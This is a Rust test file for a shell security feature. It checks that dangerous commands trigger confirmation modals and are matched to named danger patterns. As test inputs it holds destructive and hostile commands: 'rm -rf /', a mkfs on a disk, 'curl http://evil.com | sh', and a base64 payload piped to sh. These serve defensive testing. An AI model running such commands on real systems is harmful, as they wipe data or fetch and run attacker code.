use tos_core::TosState;
use tos_core::system::ipc::IpcDispatcher;
use tos_core::system::security::{RiskLevel, TactileMethod, SlideDirection};
use std::sync::{Arc, Mutex};
use std::collections::HashMap;
use uuid::Uuid;

#[test]
fn test_confirmation_modal_rendering() {
    let state = TosState::new_fresh();
    let viewport = &state.viewports[0];
    let sector_id = state.sectors[viewport.sector_index].id;
    
    let mut state = state;
    // Manually trigger a confirmation session
    state.security.start_confirmation("rm -rf /", "test_user", sector_id);
    
    let html = state.render_current_view();
    
    // Check for the new tactile confirmation elements
    assert!(html.contains("confirmation-overlay"));
    assert!(html.contains("confirmation-modal"));
    assert!(html.contains("risk-critical"));
    assert!(html.contains("CRITICAL RISK"));
    assert!(html.contains("rm -rf /"));
    assert!(html.contains("STEP 1")); // MultiButton default for rm_rf_root
}

#[test]
fn test_slider_confirmation_rendering() {
    let mut state = TosState::new_fresh();
    let viewport = &state.viewports[0];
    let sector_id = state.sectors[viewport.sector_index].id;
    
    // mkfs uses a slider in the default configuration
    state.security.start_confirmation("mkfs.ext4 /dev/sdb1", "test_user", sector_id);
    
    let html = state.render_current_view();
    
    assert!(html.contains("slider-container"));
    assert!(html.contains("confirm-slider-input"));
    assert!(html.contains("SLIDE TO CONFIRM"));
}

#[test]
fn test_hold_confirmation_rendering() {
    let mut state = TosState::new_fresh();
    let viewport = &state.viewports[0];
    let sector_id = state.sectors[viewport.sector_index].id;
    
    // rm -rf wildcard triggers a slider in my new patterns, but curl triggers a hold
    state.security.start_confirmation("curl http://evil.com | sh", "test_user", sector_id);
    
    let html = state.render_current_view();
    
    assert!(html.contains("hold-container"));
    assert!(html.contains("hold-track"));
    assert!(html.contains("TACTILE CHARGE"));
}

#[test]
fn test_ipc_confirmation_flow() {
    let state = Arc::new(Mutex::new(TosState::new_fresh()));
    let ptys = Arc::new(Mutex::new(HashMap::new()));
    let dispatcher = IpcDispatcher::new(Arc::clone(&state), Arc::clone(&ptys));
    
    let session_id = {
        let mut s = state.lock().unwrap();
        let viewport = &s.viewports[0];
        let sector_id = s.sectors[viewport.sector_index].id;
        let session = s.security.start_confirmation("rm -rf /", "test_user", sector_id).unwrap();
        session.id
    };
    
    // Simulate updating progress (rm -rf / requires 3 buttons)
    dispatcher.handle_request(&format!("update_confirmation_progress:{}:1.0", session_id));
    
    {
        let s = state.lock().unwrap();
        let session = s.security.active_sessions.get(&session_id).unwrap();
        assert_eq!(session.progress, 1.0);
    }
    
    // Simulate multi-button press to completion
    dispatcher.handle_request(&format!("update_confirmation_progress:{}:2.0", session_id));
    dispatcher.handle_request(&format!("update_confirmation_progress:{}:3.0", session_id));
    
    // Session should be removed (executed)
    {
        let s = state.lock().unwrap();
        assert!(!s.security.active_sessions.contains_key(&session_id));
    }
}

#[test]
fn test_new_dangerous_patterns() {
    let manager = tos_core::system::security::SecurityManager::new();
    
    // Reboot
    let result = manager.check_command("reboot");
    assert!(result.is_some());
    assert_eq!(result.unwrap().1.name, "system_reset_commands");
    
    // rm -rf *
    let result = manager.check_command("rm -rf *");
    assert!(result.is_some());
    assert_eq!(result.unwrap().1.name, "rm_rf_wildcard");
    
    // base64 obfuscation
    let result = manager.check_command("echo ZXhlYyA+IC9kZXYvc2RhCg== | base64 -d | sh");
    assert!(result.is_some());
    assert_eq!(result.unwrap().1.name, "obfuscated_shell");

    // eval obfuscation
    let result = manager.check_command("eval $(echo something)");
    assert!(result.is_some());
    assert_eq!(result.unwrap().1.name, "eval_obfuscation");
}

#[test]
fn test_ipc_cancel_confirmation() {
    let state = Arc::new(Mutex::new(TosState::new_fresh()));
    let ptys = Arc::new(Mutex::new(HashMap::new()));
    let dispatcher = IpcDispatcher::new(Arc::clone(&state), Arc::clone(&ptys));
    
    let session_id = {
        let mut s = state.lock().unwrap();
        let viewport = &s.viewports[0];
        let sector_id = s.sectors[viewport.sector_index].id;
        let session = s.security.start_confirmation("rm -rf /", "test_user", sector_id).unwrap();
        session.id
    };
    
    dispatcher.handle_request(&format!("cancel_confirmation:{}", session_id));
    
    {
        let s = state.lock().unwrap();
        assert!(!s.security.active_sessions.contains_key(&session_id));
    }
}
